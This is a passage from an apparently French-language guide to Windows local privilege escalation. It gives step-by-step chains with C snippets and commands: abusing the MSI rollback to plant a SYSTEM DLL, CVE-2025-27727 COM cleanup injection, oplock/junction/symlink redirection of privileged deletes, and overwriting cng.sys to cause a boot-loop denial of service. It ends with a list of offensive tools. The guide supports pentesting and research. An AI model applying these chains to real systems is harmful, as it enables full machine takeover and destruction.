Pour tester l’accessibilité, résolvez `ZwUpdateWnfStateData` depuis `ntdll.dll`, soumettez une mise à jour vide pour le nom d’état de huit octets et corrélez le statut de retour avec les données de dernière exécution de la tâche ou l’activité Procmon. Le probe réduit suivant utilise la séquence d’octets de l’exemple de tâche Recall ; remplacez-la par les octets exportés pour la tâche testée.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Transformer un nettoyage récursif en suppression privilégiée

La primitive utile n’est pas le déclencheur seul, mais une routine de nettoyage privilégiée qui accepte un répertoire contrôlé par l’attaquant. Suivez l’opération depuis l’énumération jusqu’à la modification finale : la découverte des profils/sessions, les enfants sélectionnés par caractère générique, `SHCreateItemFromParsingName` et `IFileOperation::DeleteItem` sont de bons indices qu’un chemin vérifié auparavant sera ensuite parcouru de manière récursive. Si les descendants ne sont pas ouverts relativement à des handles de répertoire de confiance et validés avant la suppression, l’attaquant peut modifier la résolution entre l’énumération et l’utilisation.<sup>[[43]](#references)</sup>

Associez le déclencheur WNF à la [substitution par oplock, junction et lien symbolique de l’Object Manager](#from-folder-contents-delete-to-system-eop) décrite ci-dessous : l’oplock suspend le nettoyeur après qu’il a sélectionné l’enfant légitime, tandis que l’ancêtre accessible en écriture est remplacé. Ainsi, lorsque la suppression privilégiée reprend, elle passe par `\RPC Control` pour atteindre la cible protégée. Dans la chaîne Recall, cela a permis la suppression par SYSTEM de `C:\Config.Msi`, nécessaire à la technique documentée de rollback MSI.<sup>[[31]](#references)[[43]](#references)</sup>

### Les descendants imbriqués contournent les correctifs superficiels contre les points d’analyse

Valider uniquement la racine contrôlée par l’attaquant et son enfant immédiat ne sécurise pas une suppression récursive basée sur un chemin. Gardez ces objets vérifiés légitimes et déplacez la substitution par junction/oplock dans un enfant supplémentaire situé en dessous d’eux ; `IFileOperation::DeleteItem` finira par atteindre le descendant non validé et suivra sa nouvelle cible. CVE-2026-20941 est précisément issue de cette catégorie de correctifs incomplets : après le premier correctif Recall, `UKP` et le répertoire au format GUID étaient validés, mais l’ancienne opération de suppression récursive était conservée.<sup>[[43]](#references)</sup>

La méthode sûre consiste à ouvrir **chaque descendant** relativement à un handle de répertoire déjà fiable, à obtenir et vérifier le chemin/objet résolu final, puis à appliquer l’indicateur de suppression à ce handle vérifié. Ne validez pas un préfixe avant de revenir à une suppression récursive basée sur un chemin. Lors de l’examen d’un correctif, inspectez aussi les structures au véritable point d’appel : dans ce cas, l’inspection à l’exécution de `OBJECT_ATTRIBUTES` dans `NtCreateFile` a révélé un `RootDirectory` non nul et un nom relatif `{GUID}\\secure_file.lock`, réfutant ainsi la sortie trompeuse du décompilateur qui suggérait une seconde primitive `FILE_DELETE_ON_CLOSE`.<sup>[[43]](#references)</sup>

## De la suppression/déplacement/renommage arbitraire d’un dossier à une EoP SYSTEM

La technique décrite [**dans cet article de blog**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), avec un code d’exploit [**disponible ici**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

L’attaque consiste essentiellement à exploiter la fonctionnalité de rollback de Windows Installer pour remplacer des fichiers légitimes par des fichiers malveillants pendant le processus de désinstallation. Pour cela, l’attaquant doit créer un **installateur MSI malveillant** qui servira à détourner le dossier `C:\Config.Msi`. Windows Installer l’utilisera ensuite pour stocker les fichiers de rollback lors de la désinstallation d’autres packages MSI ; ces fichiers de rollback auront été modifiés pour contenir la charge utile malveillante.

### Injection de chemin de nettoyage COM dans Windows Installer (CVE-2025-27727)

Un client à faibles privilèges peut accéder au service `msiexec.exe` SYSTEM via l’objet COM `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). La rétro-ingénierie a identifié les appels `IMsiServer` pertinents : `MsiBeginTransactionW` à l’offset de vtable `0xA0`, `SetEEUIDirectoryAndFilter` à `0xC8` et `CleanupTempPackages` à `0x50`. Ces noms et offsets ont été obtenus par rétro-ingénierie et peuvent varier selon les builds.<sup>[[41]](#references)</sup>

Pour un utilisateur non administrateur, `SetEEUIDirectoryAndFilter` usurpe l’identité de l’appelant uniquement pendant l’ouverture du chemin fourni avec `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` et `FILE_FLAG_OPEN_REPARSE_POINT`. Cela prouve que l’appelant peut supprimer le répertoire et évite de suivre un point d’analyse, mais ne lie **pas** l’objet fichier vérifié au nettoyage ultérieur et ne prouve pas que Windows Installer l’a créé.<sup>[[41]](#references)</sup>

Après `MsiBeginTransactionW`, `SetEEUIDirectoryAndFilter` planifie le chemin en tant que dossier, quel que soit l’argument de filtre fourni par l’appelant. Le service écrit une valeur nommée `REG_DWORD` sous `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages` : le nom de la valeur est le chemin contrôlé par l’appelant et les données `0x00000002` correspondent à l’indicateur de dossier. `CleanupTempPackages(NULL, FALSE)` lance ensuite directement le nettoyage. Son worker avec privilèges élevés énumère les valeurs du registre et transmet les entrées de dossier à `FDeleteFolder`, qui procède de manière récursive sans vérifier la provenance du chemin. Si la suppression normale échoue, le code appelle également `LockdownPath`, efface les attributs du fichier et réessaie.<sup>[[41]](#references)</sup>

La séquence minimale d’appels reconstituée à partir de `msi.dll` est la suivante :<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Le primitive utile repose sur la réutilisation d’un chemin plutôt que sur une redirection par junction. Enregistrez un `C:\Config.Msi` créé par l’attaquant, supprimez-le, puis laissez Windows Installer recréer le même chemin avec des données de rollback protégées. Le nettoyage fait confiance à l’ancien nom `TempPackages` et supprime le nouveau répertoire en tant que SYSTEM. Cela contourne la limite prévue par `FILE_FLAG_OPEN_REPARSE_POINT` et la mesure d’atténuation reposant sur la confiance envers les redirections, car aucun point de réanalyse n’est nécessaire.<sup>[[41]](#references)</sup>

Ce primitive de suppression s’intègre à la chaîne de rollback ci-dessous : conservez l’enregistrement distinct `Installer\Folders`, supprimez le `C:\Config.Msi` protégé, recréez-le avec une DACL NULL et gardez un handle doté de `WRITE_DAC` ouvert avant que l’installateur ne renforce la DACL. Le handle préalablement ouvert peut rétablir une DACL permissive avec `NtSetSecurityObject`, après quoi le fichier `.rbs` généré peut être remplacé avant la reprise du rollback.<sup>[[41]](#references)</sup>

Microsoft a corrigé le problème en empêchant `CMsiTransaction::SetEEUIDirectoryAndFilter` d’appeler `ScheduleFileOrFolderDelete` lorsque le nouveau feature gate est activé. L’appel COM peut toujours renvoyer un succès, mais le chemin contrôlé par l’attaquant n’est alors plus ajouté à `TempPackages`. Installez les mises à jour de sécurité Windows d’avril 2025 au lieu de considérer le retour réussi de la méthode comme un test de correction.<sup>[[41]](#references)[[42]](#references)</sup>

La technique résumée est la suivante :

1. **Étape 1 – Préparation du hijack (laisser `C:\Config.Msi` vide)**

- Étape 1 : Installer le MSI
    - Créez un `.msi` qui installe un fichier inoffensif (par exemple, `dummy.txt`) dans un dossier accessible en écriture (`TARGETDIR`).
    - Marquez l’installateur comme **« UAC Compliant »**, afin qu’un **utilisateur non administrateur** puisse l’exécuter.
    - Gardez un **handle** ouvert sur le fichier après l’installation.

- Étape 2 : Commencer la désinstallation
    - Désinstallez le même `.msi`.
    - Le processus de désinstallation commence à déplacer les fichiers vers `C:\Config.Msi` et à les renommer en fichiers `.rbf` (sauvegardes de rollback).
    - **Interrogez le handle de fichier ouvert** avec `GetFinalPathNameByHandle` pour détecter quand le fichier devient `C:\Config.Msi\<random>.rbf`.

- Étape 3 : Synchronisation personnalisée
    - Le `.msi` inclut une **action de désinstallation personnalisée (`SyncOnRbfWritten`)** qui :
        - Signale que le fichier `.rbf` a été écrit.
        - Puis **attend** un autre événement avant de poursuivre la désinstallation.

- Étape 4 : Empêcher la suppression du `.rbf`
    - Lorsqu’il est signalé, **ouvrez le fichier `.rbf`** sans `FILE_SHARE_DELETE` — cela **empêche sa suppression**.
    - Puis **renvoyez le signal** pour que la désinstallation puisse se terminer.
    - Windows Installer échoue à supprimer le `.rbf` et, comme il ne peut pas supprimer tout le contenu, **`C:\Config.Msi` n’est pas supprimé**.

- Étape 5 : Supprimer manuellement le `.rbf`
    - Vous (l’attaquant) supprimez manuellement le fichier `.rbf`.
    - **`C:\Config.Msi` est maintenant vide**, prêt à être détourné.

> À ce stade, **déclenchez la vulnérabilité de suppression arbitraire de dossier au niveau SYSTEM** pour supprimer `C:\Config.Msi`.

2. **Étape 2 – Remplacement des scripts de rollback par des scripts malveillants**

- Étape 6 : Recréer `C:\Config.Msi` avec des ACL faibles
    - Recréez vous-même le dossier `C:\Config.Msi`.
    - Définissez des **DACL faibles** (par exemple, Everyone:F) et **gardez un handle ouvert** avec `WRITE_DAC`.

- Étape 7 : Lancer une autre installation
    - Installez à nouveau le `.msi` avec :
        - `TARGETDIR` : un emplacement accessible en écriture.
        - `ERROROUT` : une variable qui déclenche un échec forcé.
    - Cette installation servira à déclencher à nouveau le **rollback**, qui lit les fichiers `.rbs` et `.rbf`.

- Étape 8 : Surveiller l’apparition du `.rbs`
    - Utilisez `ReadDirectoryChangesW` pour surveiller `C:\Config.Msi` jusqu’à l’apparition d’un nouveau `.rbs`.
    - Notez son nom de fichier.

- Étape 9 : Synchroniser avant le rollback
    - Le `.msi` contient une **action d’installation personnalisée (`SyncBeforeRollback`)** qui :
        - Signale un événement lorsque le `.rbs` est créé.
        - Puis **attend** avant de continuer.

- Étape 10 : Réappliquer les ACL faibles
    - Après avoir reçu l’événement `« .rbs créé »` :
        - Windows Installer **réapplique des ACL strictes** à `C:\Config.Msi`.
        - Mais comme vous avez toujours un handle doté de `WRITE_DAC`, vous pouvez **réappliquer les ACL faibles**.

> Les ACL sont **uniquement vérifiées à l’ouverture du handle** ; vous pouvez donc toujours écrire dans le dossier.

- Étape 11 : Déposer de faux fichiers `.rbs` et `.rbf`
    - Remplacez le fichier `.rbs` par un **faux script de rollback** indiquant à Windows de :
        - Restaurer votre fichier `.rbf` (DLL malveillante) dans un **emplacement privilégié** (par exemple, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Déposez votre faux fichier `.rbf`, qui contient une **DLL malveillante avec une payload au niveau SYSTEM**.

- Étape 12 : Déclencher le rollback
    - Envoyez le signal de synchronisation pour que l’installateur reprenne.
    - Une **action personnalisée de type 19 (`ErrorOut`)** est configurée pour **faire volontairement échouer l’installation** à un moment précis.
    - Cela déclenche le début du **rollback**.

- Étape 13 : SYSTEM installe votre DLL
    - Windows Installer :
        - Lit votre fichier `.rbs` malveillant.
        - Copie votre DLL `.rbf` dans l’emplacement cible.
    - Votre **DLL malveillante se trouve maintenant dans un chemin chargé par SYSTEM**.

- Étape finale : Exécuter du code SYSTEM
    - Exécutez un **binaire de confiance à élévation automatique** (par exemple, `osk.exe`) qui charge la DLL détournée.
    - **Et voilà** : votre code s’exécute **en tant que SYSTEM**.


### De la suppression/déplacement/renommage arbitraire de fichiers à une élévation de privilèges SYSTEM

La principale technique de rollback MSI (la précédente) suppose que vous pouvez supprimer un **dossier entier** (par exemple, `C:\Config.Msi`). Mais que faire si votre vulnérabilité ne permet que la **suppression arbitraire de fichiers** ?

Vous pourriez exploiter les **internes de NTFS** : chaque dossier possède un flux de données alternatif caché appelé :

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Ce flux stocke les **métadonnées d’index** du dossier.

Ainsi, si vous **supprimez le flux `::$INDEX_ALLOCATION`** d’un dossier, NTFS **supprime le dossier entier** du système de fichiers.

Vous pouvez le faire à l’aide d’API standard de suppression de fichiers, comme :
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Même si vous appelez une API de suppression de *fichier*, elle **supprime le dossier lui-même**.

### De la suppression du contenu d’un dossier à une élévation de privilèges (EoP) vers SYSTEM
Que faire si votre primitive ne vous permet pas de supprimer des fichiers/dossiers arbitraires, mais qu’elle **permet de supprimer le *contenu* d’un dossier contrôlé par un attaquant** ?

1. Étape 1 : Configurer un dossier et un fichier leurres
- Créer : `C:\temp\folder1`
- À l’intérieur : `C:\temp\folder1\file1.txt`

2. Étape 2 : Placer un **oplock** sur `file1.txt`
- L’oplock **met l’exécution en pause** lorsqu’un processus privilégié tente de supprimer `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Étape 3 : Déclencher un processus SYSTEM (p. ex., `SilentCleanup`)
- Ce processus parcourt des dossiers (p. ex., `%TEMP%`) et tente d’en supprimer le contenu.
- Lorsqu’il atteint `file1.txt`, **l’oplock se déclenche** et transmet le contrôle à votre callback.

4. Étape 4 : Dans le callback de l’oplock – rediriger la suppression

- Option A : Déplacer `file1.txt` ailleurs
    - Cela vide `folder1` sans interrompre l’oplock.
    - Ne supprimez pas `file1.txt` directement — cela libérerait l’oplock prématurément.

- Option B : Convertir `folder1` en **junction** :

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Option C : Créer un **symlink** dans `\RPC Control` :
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Cela cible le flux interne NTFS qui stocke les métadonnées du dossier — le supprimer supprime le dossier.

5. Step 5: Release the oplock
- Le processus SYSTEM continue et tente de supprimer `file1.txt`.
- Mais maintenant, à cause de la junction + du symlink, il supprime en réalité :
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Résultat** : `C:\Config.Msi` est supprimé par SYSTEM.

### D’un dossier arbitraire créé à un DoS permanent

Exploitez une primitive qui vous permet de **créer un dossier arbitraire en tant que SYSTEM/admin** — même si **vous ne pouvez pas écrire de fichiers** ou **définir des permissions faibles**.

Créez un **dossier** (pas un fichier) portant le nom d’un **pilote Windows critique**, par exemple :
```
C:\Windows\System32\cng.sys
```

- Ce chemin correspond normalement au pilote en mode noyau `cng.sys`.
- Si vous le **créez au préalable sous forme de dossier**, Windows ne parvient pas à charger le pilote réel au démarrage.
- Windows tente alors de charger `cng.sys` au démarrage.
- Il trouve le dossier, **ne parvient pas à résoudre le pilote réel** et **plante ou interrompt le démarrage**.
- Il n’y a **aucun mécanisme de secours** ni **récupération** sans intervention externe (par exemple, une réparation du démarrage ou un accès au disque).

### Des chemins de journaux/sauvegardes privilégiés aux symlinks OM + points de montage NTFS : écrasement arbitraire de fichiers / DoS au démarrage

Lorsqu’un **service privilégié** écrit des journaux ou des exports vers un chemin lu depuis une **configuration modifiable**, redirigez ce chemin à l’aide de **symlinks Object Manager + points de montage NTFS** pour transformer l’écriture privilégiée en écrasement arbitraire (même **sans SeCreateSymbolicLinkPrivilege**).<sup>[[15]](#references)</sup>

**Prérequis**
- Le fichier de configuration contenant le chemin cible est modifiable par l’attaquant (par exemple, `%ProgramData%\...\.ini`).
- Possibilité de créer un point de montage vers `\RPC Control` et un symlink de fichier OM (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Une opération privilégiée qui écrit vers ce chemin (journal, export, rapport).

**Exemple de chaîne**
1. Lisez la configuration pour trouver la destination du journal privilégié, par exemple `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` dans `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Redirigez le chemin sans droits d’administrateur :
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Attendez que le composant privilégié écrive le journal (par exemple, un administrateur déclenche « envoyer un SMS de test »). L’écriture aboutit alors dans `C:\Windows\System32\cng.sys`.
4. Inspectez la cible écrasée (analyseur hexadécimal/PE) pour confirmer la corruption ; le redémarrage force Windows à charger le chemin du pilote altéré → **boot loop DoS**. Cette technique s’applique également à tout fichier protégé qu’un service privilégié ouvrira en écriture.

> `cng.sys` est normalement chargé depuis `C:\Windows\System32\drivers\cng.sys`, mais si une copie existe dans `C:\Windows\System32\cng.sys`, elle peut être tentée en premier, ce qui en fait une cible fiable pour provoquer un DoS avec des données corrompues.



## **De High Integrity à System**

### **Nouveau service**

Si vous exécutez déjà un processus High Integrity, accéder à **SYSTEM** peut être facile : il suffit de **créer et d’exécuter un nouveau service** :

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Lors de la création d'un binaire de service, assurez-vous qu'il s'agit d'un service valide ou que le binaire effectue rapidement les actions nécessaires, car il sera arrêté au bout de 20 s s'il ne s'agit pas d'un service valide.

### AlwaysInstallElevated

Depuis un processus à intégrité élevée, vous pouvez essayer **d'activer les entrées de registre AlwaysInstallElevated** et **d'installer** un reverse shell à l'aide d'un wrapper _**.msi**_.\
[Plus d'informations sur les clés de registre concernées et sur l'installation d'un package _.msi_ ici.](#alwaysinstallelevated)

### Intégrité élevée + privilège SeImpersonate vers System

**Vous pouvez** [**trouver le code ici**](seimpersonate-from-high-to-system.md)**.**

### De SeDebug + SeImpersonate aux privilèges Full Token

Si vous disposez de ces privilèges de token (vous les trouverez probablement dans un processus à intégrité élevée), vous pourrez **ouvrir presque n'importe quel processus** (à l'exception des processus protégés) grâce au privilège SeDebug, **copier le token** du processus et créer un **processus arbitraire avec ce token**.\
Cette technique consiste généralement à **sélectionner n'importe quel processus exécuté en tant que SYSTEM avec tous les privilèges du token** (_oui, vous pouvez trouver des processus SYSTEM sans tous les privilèges du token_).\
**Vous trouverez un** [**exemple de code exécutant la technique proposée ici**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Cette technique est utilisée par meterpreter pour escalader les privilèges avec `getsystem`. Elle consiste à **créer un pipe, puis à créer ou abuser d'un service pour écrire dans ce pipe**. Ensuite, le **serveur** qui a créé le pipe à l'aide du privilège **`SeImpersonate`** pourra **usurper le token** du client du pipe (le service) et obtenir les privilèges SYSTEM.\
Pour [**en savoir plus sur les named pipes, lisez ceci**](#named-pipe-client-impersonation).\
Pour lire un exemple de [**passage d'une intégrité élevée à System à l'aide de named pipes, lisez ceci**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Si vous parvenez à **détourner une dll** **chargée** par un **processus** exécuté en tant que **SYSTEM**, vous pourrez exécuter du code arbitraire avec ces autorisations. Dll Hijacking est donc également utile pour ce type d'escalade de privilèges. De plus, cette technique est **bien plus facile à réaliser depuis un processus à intégrité élevée**, car celui-ci dispose d'**autorisations d'écriture** sur les dossiers utilisés pour charger les dlls.\
**Vous pouvez** [**en savoir plus sur Dll hijacking ici**](dll-hijacking/index.html)**.**

### **D'Administrator ou Network Service à System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### De LOCAL SERVICE ou NETWORK SERVICE aux privilèges complets

**Lire :** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Aide supplémentaire

[Binaires impacket statiques](https://github.com/ropnop/impacket_static_binaries)

## Outils utiles

**Meilleur outil pour rechercher des vecteurs d'escalade de privilèges locaux Windows :** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Recherche les erreurs de configuration et les fichiers sensibles (**[**voir ici**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Détecté.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Recherche certaines erreurs de configuration possibles et collecte des informations (**[**voir ici**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Recherche les erreurs de configuration**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrait les informations des sessions enregistrées de PuTTY, WinSCP, SuperPuTTY, FileZilla et RDP. Utilisez -Thorough en local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrait les identifiants du Credential Manager. Détecté.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Teste les mots de passe collectés sur le domaine**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh est un outil PowerShell d'usurpation ADIDNS/LLMNR/mDNS et d'attaque man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Énumération Windows de base pour la recherche de privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Recherche les vulnérabilités de privesc connues (OBSOLETE, remplacé par Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Vérifications locales **(droits Admin requis)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Recherche les vulnérabilités de privesc connues (doit être compilé avec VisualStudio) ([**précompilé**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Énumère l'hôte à la recherche d'erreurs de configuration (plutôt un outil de collecte d'informations qu'un outil de privesc) (doit être compilé) **(**[**précompilé**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrait les identifiants de nombreux logiciels (exe précompilé sur github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Portage de PowerUp en C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Recherche les erreurs de configuration (exécutable précompilé sur github). Non recommandé. Fonctionne mal sur Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Recherche les erreurs de configuration possibles (exe issu de python). Non recommandé. Fonctionne mal sur Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Outil créé à partir de cet article (il n'a pas besoin d'accesschk pour fonctionner correctement, mais peut l'utiliser).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lit la sortie de **systeminfo** et recommande des exploits fonctionnels (python local)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lit la sortie de **systeminfo** et recommande des exploits fonctionnels (Python local)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Vous devez compiler le projet avec la version correcte de .NET ([voir ceci](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Pour voir la version de .NET installée sur l'hôte victime, vous pouvez exécuter :

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Fondamentaux de l’élévation de privilèges sous Windows](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Élever ses privilèges en exploitant des permissions faibles sur les dossiers](http://www.greyhathacker.net/?p=738)
- [3] [Élévation de privilèges sous Windows - aide-mémoire](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Atelier d’élévation de privilèges locale sous Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Attaques Windows : AT est le nouveau noir (Rob Fuller et Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Élévation de privilèges - Windows - Guide OSCP complet](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Élévation de privilèges - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Guide d’élévation de privilèges sous Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Liste de contrôle pour l’élévation de privilèges sous Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Élévation de privilèges sous Windows](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Méthodes d’élévation de privilèges sous Windows pour les pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo : phishing via macro VBA Word et SMTP → déchiffrement des identifiants hMailServer → Veeam CVE-2023-27532 vers SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper : leak de chaîne de format + stack BOF → VirtualAlloc ROP (RCE) et vol de token du noyau](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – À la poursuite du Silver Fox : jeu du chat et de la souris dans les ombres du noyau](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Vulnérabilité du système de fichiers avec privilèges présente dans un système SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Outils de test des liens symboliques – utilisation de CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Retour vers le passé : exploiter les liens symboliques sous Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (portage Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls : résolution dangereuse des modules sous Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Modules Node.js : chargement depuis les dossiers `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [package.json de npm : `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Défis de la liste de contrôle C/C++, résolus](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Fonction RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Détournement des binaires de service](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own avec Microslop : chaînage de CLDFLT et de race conditions dans le noyau DirectX pour une LPE Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Un seul I/O Ring pour les gouverner tous : primitive complète de lecture/écriture sous Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Exploiter les suppressions arbitraires de fichiers pour élever ses privilèges et autres astuces](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - Code d’exploit FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Attaques WSUS, partie 2 : CVE-2020-1013, élévation de privilèges locale en un jour sous Windows 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7 : découverte du Gestionnaire d’identifiants et de Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - PoC CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Délégation Kerberos contrainte basée sur les ressources : quand une modification d’image mène à une élévation de privilèges](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Extraction des clés privées SSH depuis l’agent SSH de Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
